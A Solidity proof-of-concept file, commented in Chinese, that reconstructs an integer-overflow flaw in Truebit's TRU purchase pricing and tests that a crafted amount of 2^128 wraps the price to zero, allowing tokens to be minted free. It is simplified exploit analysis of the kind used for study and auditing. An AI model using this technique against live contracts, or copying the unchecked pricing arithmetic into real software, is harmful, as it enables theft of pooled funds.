// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/*
  PoC — Truebit $26.2M 整数溢出(2026-01-08)

  真实漏洞:Truebit 的 TRU 购买合约用 Solidity 0.6.10 编译,该版本【默认不做算术溢出检查】。
  其购买定价分子(BlockSec / Olympix 反编译还原):
      numerator = 100 * amount^2 * reserve  +  200 * totalSupply * amount * reserve
  当 amount 极大时,二次项 `100 * amount^2 * reserve` 超过 2^256 并【静默回绕(wrap)】,
  使算出的购买价格被截断到接近 0 —— 攻击者几乎 0 成本铸出海量 TRU,再卖回 bonding-curve 抽走 ETH 储备。

  本 PoC 用 `unchecked {}` 还原 0.6.10 的"无溢出检查"语义,证明:
    1) 正常买入(1 TRU)需要付费(价格 > 0);
    2) 构造一个让 amount^2 回绕的极大 amount,使价格塌到 0 —— 即"免费铸币"。
  运行:forge test -vv
*/

// 还原后的脆弱定价合约(等价于 0.6.10 无 SafeMath 的算术)
contract VulnerableTruebitPricing {
    uint256 public reserve;          // ETH 储备(18 位精度,数千 ETH 量级)
    uint256 public constant DENOM = 1e36;

    constructor(uint256 _reserve) {
        reserve = _reserve;
    }

    // 文档化的分子二次项:100 * amount^2 * reserve(就是它溢出)
    // 0.6.10 不检查溢出 —— 这里用 unchecked 精确还原该语义
    function getPurchasePrice(uint256 amount) public view returns (uint256 price) {
        unchecked {
            uint256 numerator = 100 * amount * amount * reserve;
            price = numerator / DENOM;
        }
    }
}

contract TruebitOverflowPoC {
    VulnerableTruebitPricing internal pool;

    constructor() {
        // 储备 ~21,000 ETH(2.1e22 wei) —— 与事发时合约储备量级一致
        pool = new VulnerableTruebitPricing(2.1e22);
    }

    // 1) 诚实买入应当付费
    function test_honest_buy_costs_eth() external view {
        uint256 price = pool.getPurchasePrice(1e18); // 买 1 TRU
        require(price > 0, "honest buy must cost > 0 ETH");
    }

    // 2) 构造 amount = 2^128:amount^2 = 2^256 ≡ 0 (mod 2^256)
    //    => 二次项分子回绕为 0 => 价格 = 0 => 免费铸币
    function test_overflow_makes_mint_free() external view {
        uint256 crafted = 2 ** 128;
        uint256 price = pool.getPurchasePrice(crafted);
        require(price == 0, "PoC failed: overflow did not zero the price");
        // 对照:买 1 TRU 要钱,买 2^128 个 TRU 却 0 成本 —— 这就是攻击者的免费弹药
        require(pool.getPurchasePrice(1e18) > price, "monotonicity must be broken by overflow");
    }
}
